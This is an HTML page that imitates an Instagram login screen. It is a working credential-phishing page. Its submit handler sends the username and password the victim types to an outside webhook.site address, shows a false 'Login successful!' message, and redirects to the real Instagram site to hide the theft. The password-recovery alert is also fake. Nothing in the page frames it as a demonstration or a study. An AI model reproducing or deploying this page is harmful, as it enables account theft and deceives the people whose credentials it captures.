CTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 30px;
            border-radius: 3px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .login-box img {
            width: 90px;
            height: 90px;
            border-radius: 20%;
            margin-bottom: 1px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background-color: #0081d6;
        }
        .error {
            color: red;
            font-size: 12px;
            margin-top: 10px;
        }
        .forgot-password {
            margin-top: 10px;
            color: #00376b;
            cursor: pointer;
        }
        .eye-icon {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRVKWbnitPpgYPuE0TaoKaEPAfsKzuNzceltg4NUOIY-A&s=10" alt="Instagram Logo">
        <h2>instagram</h2>
        <div style="position: relative;">
            <input type="text" id="user" placeholder="Username" required>
        </div>
        <div style="position: relative;">
            <input type="password" id="pass" placeholder="Password" required>
            <span class="eye-icon" onclick="togglePasswordVisibility()">???</span>
        </div>
        <button onclick="submitData()">Log in</button>
        <p id="message" class="error"></p>
        <p class="forgot-password" onclick="forgotPassword()">Forgot password?</p>
    </div>
    <script>
        function submitData() {
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            const message = document.getElementById('message');
            if (!user.trim() || !pass.trim()) {
                message.textContent = "Please enter a username and password.";
                return;
            }
            const data = "Username: " + user + " | Password: " + pass;
            fetch('https://webhook.site/a400c39d-fa24-4665-befa-c4c17a96e712  ', {
                method: 'POST',
                body: JSON.stringify({ content: data })
            });
            message.textContent = "Login successful!";
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/";
            }, 2000);
        }

        function forgotPassword() {
            const user = document.getElementById('user').value;
            if (!user.trim()) {
                alert("Please enter your username to recover your password.");
                return;
            }
            alert("Password recovery instructions have been sent to your email.");
        }

        function togglePasswordVisibility() {
            const passwordInput = document.getElementById('pass');
            const eyeIcon = document.querySelector('.eye-icon');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.textContent = '???';
            } else {
                passwordInput.type = 'password';
                eyeIcon.textContent = '???';
            }
        }
    </script>
</body>
</html>
